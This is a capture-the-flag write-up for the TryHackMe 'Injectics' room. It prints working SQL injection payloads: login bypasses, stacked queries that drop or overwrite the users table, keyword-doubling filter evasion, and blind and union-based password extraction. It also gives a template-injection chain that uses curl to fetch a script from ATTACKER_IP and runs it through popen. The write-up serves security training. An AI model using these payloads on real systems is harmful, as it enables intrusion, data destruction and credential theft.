# Injectics

Main idea of this room is around SQL injection during UPDATE statements. In particular the `edit_leaderboard.php` endpoint allows us to `DROP` the users table. From an html comment you should be aware (see `mail.log` file) that the users table will be repopulated with default credentials.

`login.php` is vulnerable to sql injection but is heavily filtered. We can bypass restrictions with the following payload:

```
username=foo'||1--+&password=foo&function=login
```

This will give access to the dashboard as user **dev** (the first one in the users table). We can also log in as admin but we won't be able to get the flag this way.

```
username=foo'||1+LIMIT+0,1--+&password=foo&function=login     ---> login as dev
username=foo'||1+LIMIT+1,1--+&password=foo&function=login     ---> login as admin
```

In order to get the first flag we have to use the admin login endpoint, but that is not vulnerable to SQLi.

Once we have access to the admin dashboard, either as user dev or admin, we can edit the leaderboard and from there we can drop the users table:

```
POST /edit_leaderboard.php

rank=1&country=USA&gold=1&silver=2&bronze=3;drop+table+users;--+
```

will execute a query similar to the following:

```sql
UPDATE leaderboard set gold=1, silver=2, bronze=3; drop table users;-- everything else ignored
```

An alternative could be setting `password = 'foo'` with something like this (but I got it only after completing the room and seeing that the `OR` keyword is deleted from queries)

```
POST /edit_leaderboard.php

rank=1&country=USA&gold=1&silver=2&bronze=3; UPDATE users set passwoORrd='foo';--
```

After a couple of minutes the users table will be re-populated with default credentials that we can now use to login as `superadmin@injectics.thm`.

Editing our profile ad setting name to `{{7*7}}`, we see that we have a template injection. Some functions like `system` or `shell_exec` are disabled but we can use `popen`:

```
fname={{['curl+ATTACKER_IP:8000/s+-o+/tmp/s','r']|sort('popen')|join}}
fname={{['sh+/tmp/s','r']|sort('popen')|join}}
```

### extracting initial passwords one char at a time

Only after getting access to the source code I was able to understand that some keywords are deleted: in particular `SELECT` and `OR`. I was not aware of that because my initial payload did not involve the `OR` keyword.

Keeping this in mind we also have a cool way to extract the initial password from the users table (three characters at a time, or up to 18 characters if using all six ranks available):

```
rank=1&country=usa&gold=ascii(mid((selSELECTect+group_concat(passwoORrd)+from+users),1,1))&silver=ascii(mid((selSELECTect+group_concat(passwoORrd)+from+users),2,1))&bronze=ascii(mid((selSELECTect+group_concat(passwoORrd)+from+users),3,1))
```

The capital `SELECT` and `OR` will be deleted so we obtain a query like this:

```sql
UPDATE leaderbord set gold   = ascii(mid((select+group_concat(password)+from+users),1,1)),
                      silver = ascii(mid((select+group_concat(password)+from+users),2,1)),
                      bronze = ascii(mid((select+group_concat(password)+from+users),3,1)) 
where rank=1;
```

Or 18 characters at a time with six calls to `edit_leaderboard.php`:

<figure><img src="../../.gitbook/assets/image (26).png" alt=""><figcaption></figcaption></figure>

```
MariaDB [(none)]> select char(50,51,52,50,115,100,115,102,119,102,50,119,114,50,114,102,44,51);
+-----------------------------------------------------------------------+
| char(50,51,52,50,115,100,115,102,119,102,50,119,114,50,114,102,44,51) |
+-----------------------------------------------------------------------+
| 2342sdsfwf2wr2rf,3                                                    |
+-----------------------------------------------------------------------+
```

Password for superadmin is left as an exercise to the reader. With some patience we can recover the initial passwords and login without having to drop the users table, or changing the current password, thus being more stealthy!

### extracting initial password via union select

Again, having source code and playing a little bit locally we can also extract initial password from the original login:

```
POST /functions.php HTTP/1.1

username=a'+ununionion+all+select+1,F.1,F.4,4,5,6+FROM+(SELECT+1,2,3,4,5,6+UunionNION+select+*+FROM+users)F+limit+1,1--+&password=foo&function=login
```

This becomes

```sql
'a' union all select 1,F.1,F.4,4,5,6 FROM (SELECT 1,2,3,4,5,6 UNION select * FROM users)F limit 1,1-- 
```

See https://book.hacktricks.xyz/pentesting-web/sql-injection#bypass-column-names-restriction for an explanation of this query.

Go here https://tryhackme.com/r/room/injectics to play the room!
